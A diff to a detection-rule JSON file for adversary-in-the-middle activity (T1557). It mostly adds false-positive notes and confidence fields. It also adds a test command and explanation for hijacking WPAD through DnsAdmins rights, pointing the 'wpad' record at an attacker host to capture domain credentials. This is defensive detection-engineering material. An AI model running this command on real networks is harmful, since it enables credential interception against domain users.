@@ -97,7 +97,8 @@
           "T1557"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "splunk",
@@ -108,7 +109,8 @@
           "T1557"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate software using DLL injection for hooking (AV, accessibility tools)"
       },
       {
         "platform": "splunk",
@@ -119,7 +121,8 @@
           "T1557"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate software using DLL injection for hooking (AV, accessibility tools)"
       },
       {
         "platform": "sigma",
@@ -130,7 +133,8 @@
           "T1557"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate software using DLL injection for hooking (AV, accessibility tools)"
       },
       {
         "platform": "elastic",
@@ -140,7 +144,9 @@
         "attack": [
           "T1557"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Legitimate software using DLL injection for hooking (AV, accessibility tools)",
+        "confidence": "medium"
       }
     ],
     "visibility": {
@@ -175,7 +181,8 @@
         "Review PowerShell Script Block / Module Logs, Windows Security Event Log, DNS logs for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain> -ComputerName <dc> -IPv4Address <lhost>"
     }
   },
   "explain": "Alternative DnsAdmins abuse - hijack WPAD for credential capture:\n  Add-DnsServerResourceRecordA   add a DNS A record\n  -Name wpad               the Web Proxy Auto-Discovery name clients look up\n  -ZoneName <domain> -ComputerName <dc>   the zone and DC to write it on\n  -IPv4Address <lhost>     point wpad at your host\nAfter disabling the Global Query Block List, domain clients route proxy auto-config through you, enabling credential capture / MITM."
